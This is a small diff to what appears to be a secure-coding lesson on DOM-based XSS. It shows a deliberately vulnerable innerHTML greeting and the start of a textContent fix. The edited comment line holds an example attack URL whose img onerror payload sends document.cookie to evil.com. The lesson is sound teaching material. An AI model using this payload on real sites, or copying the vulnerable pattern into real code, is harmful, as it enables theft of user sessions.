@@ -56,7 +56,7 @@ const LESSON_SECURITY = {
 // ❌ DOM XSS — vulnerable frontend code
 const name = new URLSearchParams(location.search).get('name');
 document.getElementById('greeting').innerHTML = 'Hello ' + name;
-// URL: /welcome?name=<img src=x onerror="fetch('//evil.com?c='+document.cookie)">
+// URL: /welcome?name=&lt;img src=x onerror="fetch('//evil.com?c='+document.cookie)"&gt;
 // The onerror handler runs in the user's browser on your domain.
 
 // ✅ Fix 1 — use textContent, not innerHTML (browser won't execute scripts)
